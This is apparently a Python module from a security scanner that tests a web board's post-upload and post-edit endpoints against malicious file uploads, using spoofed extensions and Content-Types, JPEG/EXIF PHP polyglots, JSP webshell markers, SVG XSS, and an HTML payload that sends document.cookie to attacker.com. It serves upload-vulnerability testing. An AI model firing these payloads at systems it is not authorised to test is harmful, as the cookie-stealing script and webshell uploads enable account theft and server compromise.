"""Board (posts) malicious file upload probes — ported from ARGUS_Modular 4-1."""

from __future__ import annotations

import importlib.util
import io
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Any

import httpx

_MODULE_DIR = Path(__file__).resolve().parent


def _judge():
    name = "diag_g21_upload_judge"
    if name not in sys.modules:
        spec = importlib.util.spec_from_file_location(name, _MODULE_DIR / "upload_judge.py")
        if spec is None or spec.loader is None:
            raise ImportError("upload_judge")
        mod = importlib.util.module_from_spec(spec)
        sys.modules[name] = mod
        spec.loader.exec_module(mod)
    return sys.modules[name]


def _post_case(
    ctx: Any,
    *,
    filename: str,
    content: bytes,
    content_type: str,
    attack_desc: str,
) -> UploadCaseResult:
    endpoint = "/api/v1/posts"
    url = f"{ctx.base_url}{endpoint}"
    params = {"title": f"Test {filename[:30]}", "content": "test", "type": "PHOTO", "memberId": 1}
    files = {"images": (filename, content, content_type)}
    judge = _judge()
    try:
        response = ctx.client.post(url, params=params, files=files, headers=ctx.headers)
        return judge.judge_upload_response(
            suite="board_post",
            method="POST",
            endpoint=endpoint,
            filename=filename,
            attack_desc=attack_desc,
            response=response,
        )
    except httpx.HTTPError as exc:
        return judge.judge_upload_response(
            suite="board_post",
            method="POST",
            endpoint=endpoint,
            filename=filename,
            attack_desc=attack_desc,
            response=None,
            error=str(exc),
        )


def run_board_post_probes(ctx: Any) -> list:
    judge = _judge()
    UploadCaseResult = judge.UploadCaseResult
    results: list = []

    results.append(
        _post_case(
            ctx,
            filename="photo.jpg",
            content=b"<?php echo 'UPLOAD_TEST'; ?>",
            content_type="application/x-php",
            attack_desc="Content-Type 변조",
        )
    )

    for fname, label in [
        ("shell.php", "확장자 변조 (.php)"),
        ("shell.php.jpg", "이중 확장자 (.php.jpg)"),
        ("shell.jpg.php", "이중 확장자 (.jpg.php)"),
        ("shell.PHP", "대소문자 우회 (.PHP)"),
    ]:
        results.append(
            _post_case(
                ctx,
                filename=fname,
                content=b"<?php echo 'UPLOAD_TEST'; ?>",
                content_type="image/jpeg",
                attack_desc=f"파일명/확장자 변조: {label}",
            )
        )

    polyglot = (
        b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00"
        + b'<?php echo "UPLOAD_TEST"; ?>'
        + b"\xff\xd9"
    )
    results.append(
        _post_case(
            ctx,
            filename="malicious.php.jpg",
            content=polyglot,
            content_type="image/jpeg",
            attack_desc="JPEG+PHP 폴리글랏",
        )
    )
    results.extend(_exif_polyglot(ctx))

    script_cases = [
        (
            "exploit.html",
            b'<html><body><script>document.location="http://attacker.com/?c="+document.cookie</script></body></html>',
            "text/html",
            "HTML (text/html)",
        ),
        (
            "exploit.html",
            b'<html><body><script>document.location="http://attacker.com/?c="+document.cookie</script></body></html>',
            "image/jpeg",
            "HTML 위장 (image/jpeg)",
        ),
        (
            "xss.svg",
            b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>',
            "image/svg+xml",
            "SVG XSS",
        ),
        (
            "shell.jsp",
            b'<%@ page import="java.io.*" %><% out.println("UPLOAD_TEST"); %>',
            "image/jpeg",
            "JSP 웹셸",
        ),
        (
            "shell.jspx",
            b'<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.1">'
            b'<jsp:scriptlet>out.println("UPLOAD_TEST");</jsp:scriptlet></jsp:root>',
            "image/jpeg",
            "JSPX 웹셸",
        ),
    ]
    for filename, content, content_type, desc in script_cases:
        results.append(
            _post_case(
                ctx,
                filename=filename,
                content=content,
                content_type=content_type,
                attack_desc=desc,
            )
        )

    return results


def _exif_polyglot(ctx: Any) -> list:
    judge = _judge()
    UploadCaseResult = judge.UploadCaseResult
    endpoint = "/api/v1/posts"
    url = f"{ctx.base_url}{endpoint}"
    params = {"title": "Polyglot Test B", "content": "test", "type": "PHOTO", "memberId": 1}

    exiftool_cmd = shutil.which("exiftool")
    if exiftool_cmd is None and os.name == "nt":
        user_profile = os.environ.get("USERPROFILE", "")
        for path in (
            os.path.join(user_profile, "AppData", "Local", "Programs", "ExifTool", "exiftool.exe"),
            r"C:\Program Files\OliverBetz\ExifTool\exiftool.exe",
        ):
            if os.path.exists(path):
                exiftool_cmd = path
                break

    if not exiftool_cmd:
        return [
            UploadCaseResult(
                suite="board_post",
                method="POST",
                endpoint=endpoint,
                filename="malicious.php (EXIF)",
                attack_desc="EXIF Comment PHP 삽입",
                status_code=0,
                verdict="skipped",
                detail="exiftool 미설치 — 건너뜀",
            )
        ]

    base_jpg = os.path.join(tempfile.gettempdir(), "argus_g21_normal.jpg")
    out_php = os.path.join(tempfile.gettempdir(), "argus_g21_malicious.php")
    try:
        try:
            from PIL import Image as pil_image

            img = pil_image.new("L", (1, 1), color=128)
            buf = io.BytesIO()
            img.save(buf, format="JPEG")
            minimal_jpg = buf.getvalue()
        except ImportError:
            minimal_jpg = b"\xff\xd8\xff\xd9"

        with open(base_jpg, "wb") as handle:
            handle.write(minimal_jpg)

        result = subprocess.run(
            [
                exiftool_cmd,
                "-m",
                '-Comment=<?php echo "VULN_TEST_UPLOAD"; ?>',
                base_jpg,
                "-o",
                out_php,
            ],
            capture_output=True,
            timeout=10,
        )
        if not os.path.exists(out_php):
            raise subprocess.CalledProcessError(result.returncode, exiftool_cmd, stderr=result.stderr)

        with open(out_php, "rb") as handle:
            content = handle.read()

        files = {"images": ("malicious.php", content, "image/jpeg")}
        response = ctx.client.post(url, params=params, files=files, headers=ctx.headers)
        return [
            judge.judge_upload_response(
                suite="board_post",
                method="POST",
                endpoint=endpoint,
                filename="malicious.php (EXIF)",
                attack_desc="EXIF Comment PHP 삽입",
                response=response,
            )
        ]
    except (subprocess.CalledProcessError, OSError, httpx.HTTPError) as exc:
        return [
            judge.judge_upload_response(
                suite="board_post",
                method="POST",
                endpoint=endpoint,
                filename="malicious.php (EXIF)",
                attack_desc="EXIF Comment PHP 삽입",
                response=None,
                error=str(exc),
            )
        ]
    finally:
        for tmp_path in (base_jpg, out_php):
            try:
                os.remove(tmp_path)
            except OSError:
                pass


def run_board_edit_probes(ctx: Any) -> list:
    judge = _judge()
    UploadCaseResult = judge.UploadCaseResult
    endpoint_base = "/api/v1/posts"
    post_id = None
    try:
        listing = ctx.client.get(
            f"{ctx.base_url}{endpoint_base}?page=0&size=1",
            headers=ctx.headers,
        )
        if listing.status_code == 200:
            items = listing.json().get("data", {}).get("content", [])
            if items:
                post_id = items[0].get("postId") or items[0].get("id")
    except httpx.HTTPError:
        pass
    if not post_id:
        post_id = 1

    endpoint = f"{endpoint_base}/{{postId}}".replace("{postId}", str(post_id))
    params = {"title": "Edit Upload Test", "content": "test", "type": "PHOTO"}
    attack_cases = [
        ("shell.php", b"<?php echo 'EDIT_UPLOAD_TEST'; ?>", "image/jpeg", "PHP 확장자 변조"),
        ("shell.php.jpg", b"<?php echo 'EDIT_UPLOAD_TEST'; ?>", "image/jpeg", "이중 확장자 (.php.jpg)"),
        ("photo.jpg", b"<?php echo 'EDIT_UPLOAD_TEST'; ?>", "application/x-php", "Content-Type 변조"),
        (
            "thumb.svg",
            b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>',
            "image/svg+xml",
            "SVG XSS",
        ),
    ]

    results: list = []
    for filename, content, content_type, desc in attack_cases:
        files = {"images": (filename, content, content_type)}
        try:
            response = ctx.client.put(
                f"{ctx.base_url}{endpoint_base}/{post_id}",
                params=params,
                files=files,
                headers=ctx.headers,
            )
            if response.status_code == 404:
                results.append(
                    UploadCaseResult(
                        suite="board_edit",
                        method="PUT",
                        endpoint=endpoint,
                        filename=filename,
                        attack_desc=desc,
                        status_code=404,
                        verdict="review",
                        detail=f"게시글 없음 (postId={post_id})",
                    )
                )
            else:
                results.append(
                    judge.judge_upload_response(
                        suite="board_edit",
                        method="PUT",
                        endpoint=endpoint,
                        filename=filename,
                        attack_desc=desc,
                        response=response,
                    )
                )
        except httpx.HTTPError as exc:
            results.append(
                judge.judge_upload_response(
                    suite="board_edit",
                    method="PUT",
                    endpoint=endpoint,
                    filename=filename,
                    attack_desc=desc,
                    response=None,
                    error=str(exc),
                )
            )
    return results
